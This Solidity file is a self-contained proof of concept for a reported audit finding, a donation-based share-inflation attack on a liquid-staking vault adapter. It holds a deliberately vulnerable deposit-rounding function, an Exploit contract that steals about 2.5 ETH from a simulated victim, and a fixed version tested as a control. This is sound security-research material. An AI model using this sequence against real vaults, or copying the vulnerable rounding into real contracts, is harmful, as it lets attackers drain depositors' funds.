// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Napier — BaseLSTAdapter inflation (Sherlock, finding #30578, H-4).

    SYNTHETIC, cheatcode-free. prefundedDeposit reverts only when the minted
    shares round down to zero. That does not stop a 1-wei first deposit plus a
    direct 5 stETH donation. The victim's 10 WETH then mints 1 share, because
    previewDeposit rounds down against totalAssets(), and totalAssets() is
    stETH.balanceOf plus the buffer. The attacker redeems 7.5 WETH. Net profit
    and the victim's shortfall are each 2.5 ETH minus 1 wei.

    The fixed adapter uses the virtual-share rounding
    assets * (supply + 1) / (totalAssets + 1). The same sequence loses money. */

contract MockToken {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(string memory name_, string memory symbol_) {
        name = name_;
        symbol = symbol_;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }
}

contract BaseLSTAdapter {
    MockToken public weth;
    MockToken public steth;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    uint128 public bufferEth;
    uint128 public withdrawalQueueEth;

    error ZeroShares();

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(MockToken weth_, MockToken steth_) {
        weth = weth_;
        steth = steth_;
    }

    function totalAssets() public view returns (uint256) {
        return uint256(withdrawalQueueEth) + uint256(bufferEth) + steth.balanceOf(address(this));
    }

    function previewDeposit(uint256 assets) public view virtual returns (uint256) {
        uint256 supply = totalSupply;
        if (supply == 0) return assets;
        // @> VULN: rounds down against donation-inflated totalAssets(), so 10 ETH mints 1 share
        return assets * supply / totalAssets();
    }

    function previewRedeem(uint256 shares) public view virtual returns (uint256) {
        return shares * totalAssets() / totalSupply;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function prefundedDeposit() external virtual returns (uint256, uint256) {
        uint256 bufferEthCache = bufferEth; // cache storage reads
        uint256 queueEthCache = withdrawalQueueEth; // cache storage reads
        uint256 assets = weth.balanceOf(address(this)) - bufferEthCache; // amount of WETH deposited at this time
        uint256 shares = previewDeposit(assets);

        if (assets == 0) return (0, 0);
        if (shares == 0) revert ZeroShares();

        _mint(msg.sender, shares);

        uint256 availableEth = bufferEthCache + assets;
        uint256 targetBufferEth = ((totalAssets() + assets) * 1e18) / 1e18;
        if (targetBufferEth >= availableEth + queueEthCache) {
            bufferEth = uint128(availableEth);
            return (assets, shares);
        }
        revert("stake path unused");
    }

    function prefundedRedeem(address recipient) external virtual returns (uint256 assetsOut) {
        uint256 shares = balanceOf[address(this)];
        assetsOut = previewRedeem(shares);
        _burn(address(this), shares);

        uint256 fromWeth = assetsOut;
        uint256 wBal = weth.balanceOf(address(this));
        if (fromWeth > wBal) fromWeth = wBal;
        if (fromWeth > bufferEth) fromWeth = uint256(bufferEth);
        bufferEth -= uint128(fromWeth);
        if (fromWeth != 0) weth.transfer(recipient, fromWeth);
        uint256 rest = assetsOut - fromWeth;
        if (rest != 0) steth.transfer(recipient, rest);
    }

    function _mint(address to, uint256 amount) internal {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function _burn(address from, uint256 amount) internal {
        balanceOf[from] -= amount;
        totalSupply -= amount;
        emit Transfer(from, address(0), amount);
    }
}

contract BaseLSTAdapterFixed is BaseLSTAdapter {
    constructor(MockToken weth_, MockToken steth_) BaseLSTAdapter(weth_, steth_) {}

    function previewDeposit(uint256 assets) public view override returns (uint256) {
        return assets * (totalSupply + 1) / (totalAssets() + 1);
    }
}

contract Victim {
    function deposit(BaseLSTAdapter adapter, MockToken weth, uint256 amount) external {
        weth.transfer(address(adapter), amount);
        adapter.prefundedDeposit();
    }

    function redeem(BaseLSTAdapter adapter) external {
        uint256 shares = adapter.balanceOf(address(this));
        adapter.transfer(address(adapter), shares);
        adapter.prefundedRedeem(address(this));
    }
}

contract Exploit {
    MockToken public weth;
    MockToken public steth;
    BaseLSTAdapter public adapter;
    BaseLSTAdapterFixed public fixedAdapter;
    Victim public victim;

    uint256 public attackerWethGain;
    uint256 public attackerNet;
    uint256 public victimValue;
    uint256 public victimShortfall;
    uint256 public victimShares;

    constructor() {
        weth = new MockToken("Wrapped Ether", "WETH");
        steth = new MockToken("Lido Staked ETH", "stETH");
        adapter = new BaseLSTAdapter(weth, steth);
        fixedAdapter = new BaseLSTAdapterFixed(weth, steth);
        victim = new Victim();
        weth.mint(address(this), 1);
        steth.mint(address(this), 5 ether);
        weth.mint(address(victim), 10 ether);
    }

    function run() external {
        uint256 wethBefore = weth.balanceOf(address(this));
        uint256 stethBefore = steth.balanceOf(address(this));

        weth.transfer(address(adapter), 1);
        adapter.prefundedDeposit();
        steth.transfer(address(adapter), 5 ether);
        victim.deposit(adapter, weth, 10 ether);
        victimShares = adapter.balanceOf(address(victim));

        uint256 mine = adapter.balanceOf(address(this));
        adapter.transfer(address(adapter), mine);
        adapter.prefundedRedeem(address(this));
        victim.redeem(adapter);

        uint256 wethAfter = weth.balanceOf(address(this));
        uint256 stethAfter = steth.balanceOf(address(this));
        attackerWethGain = wethAfter - wethBefore;
        attackerNet = attackerWethGain - (stethBefore - stethAfter);
        victimValue = weth.balanceOf(address(victim)) + steth.balanceOf(address(victim));
        victimShortfall = 10 ether - victimValue;

        require(victimShares == 1, "victim did not get 1 share");
        require(attackerWethGain == 7499999999999999999, "WETH gain");
        require(attackerNet == 2499999999999999999, "net profit");
        require(victimShortfall == 2499999999999999999, "shortfall");
    }

    function control() external {
        weth.transfer(address(fixedAdapter), 1);
        fixedAdapter.prefundedDeposit();
        steth.transfer(address(fixedAdapter), 5 ether);
        victim.deposit(fixedAdapter, weth, 10 ether);
        uint256 shares = fixedAdapter.balanceOf(address(victim));

        uint256 wethBefore = weth.balanceOf(address(this));
        uint256 mine = fixedAdapter.balanceOf(address(this));
        fixedAdapter.transfer(address(fixedAdapter), mine);
        fixedAdapter.prefundedRedeem(address(this));
        uint256 wethGain = weth.balanceOf(address(this)) - wethBefore;

        victim.redeem(fixedAdapter);
        uint256 value = weth.balanceOf(address(victim)) + steth.balanceOf(address(victim));

        require(shares == 3, "fixed rounding did not mint 3 shares");
        require(wethGain == 3750000000000000000, "control WETH out");
        require(wethGain < 5 ether, "control attacker profited");
        require(steth.balanceOf(address(this)) == 0, "donation not spent");
        require(value >= 10 ether, "control victim short");
    }
}
